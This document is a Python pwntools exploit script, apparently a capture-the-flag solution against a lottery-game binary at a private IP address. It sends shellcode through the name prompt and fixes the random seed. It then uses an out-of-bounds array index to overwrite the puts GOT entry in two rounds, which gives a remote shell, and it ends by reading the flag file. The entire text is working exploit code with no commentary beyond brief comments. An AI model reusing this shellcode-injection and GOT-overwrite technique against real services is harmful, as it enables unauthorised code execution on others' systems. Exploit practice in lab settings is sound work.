from pwn import *


context.arch = 'amd64'

# seed(0x30303030)

shellcode = asm(
    shellcraft.sh()
)
conn = remote('192.168.122.129', 10172)

target = [0x6020f0 + 0x20, 0] # puts@GOT to target
puts_got_offset = -43 # relative to guess[]
payload = b'0' * 0x20 + shellcode # sets seed(0x30303030) and inject shellcode
lottery_nums = [17, 54, 86, 73, 74, 70]

# send for binary, sendline for ascii

conn.sendafter(b'name: ', payload)
conn.sendlineafter(b'age: ', b'100')

# first round
for i in range(6):
    sleep(0.1)
    conn.sendlineafter(b': ', str(lottery_nums[i] - 1).encode()) # off by one 
conn.sendlineafter(b']: ', b'1')
conn.sendlineafter(b']: ', str(puts_got_offset).encode()) # Modify first half
conn.sendlineafter(b':', str(target[0]).encode()) # new address
print(f"[+] Round 1: guess[{puts_got_offset - 1}] modified to {hex(target[0])}")

# second round 
for i in range(6):
    sleep(0.1)
    conn.sendlineafter(b': ', str(lottery_nums[i]).encode()) # correct this time
conn.sendlineafter(b']: ', b'1')
conn.sendlineafter(b']: ', str(puts_got_offset + 1).encode()) # Modify second half
conn.sendlineafter(b':', str(target[1]).encode())  
print(f"[+] Round 2: guess[{puts_got_offset}] modified to {hex(target[1])}")

conn.sendline(b'cat /home/$(whoami)/flag')
conn.interactive()

